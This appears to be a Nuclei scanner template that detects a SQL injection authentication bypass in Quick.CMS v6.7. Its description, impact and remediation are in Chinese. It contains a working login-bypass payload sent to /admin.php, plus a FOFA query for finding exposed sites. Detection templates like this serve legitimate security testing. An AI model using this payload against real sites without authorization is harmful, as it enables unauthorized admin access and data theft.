id: quick-cms-sqli

info:
  name: Quick.CMS v6.7 - SQL 注入漏洞
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 Quick.CMS v6.7 - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/admin.php?p=login` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://packetstormsecurity.com/files/177657/Quick.CMS-6.7-SQL-Injection.html
    - https://www.exploit-db.com/exploits/51910
  classification:
    cpe: cpe:2.3:a:opensolution:quick.cms:*:*:*:*:*:*:*:*
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
    vendor: opensolution
    product: quick.cms
    fofa-query: body="Quick.Cms v6.7"
  tags: packetstorm,quickcms,sqli,cms,vuln

http:
  - raw:
      - |
        POST /admin.php?p=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true

    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Log out</a>"
          - "Settings</a>"
          - "Plugins</a>"
        condition: and

      - type: status
        status:
          - 200
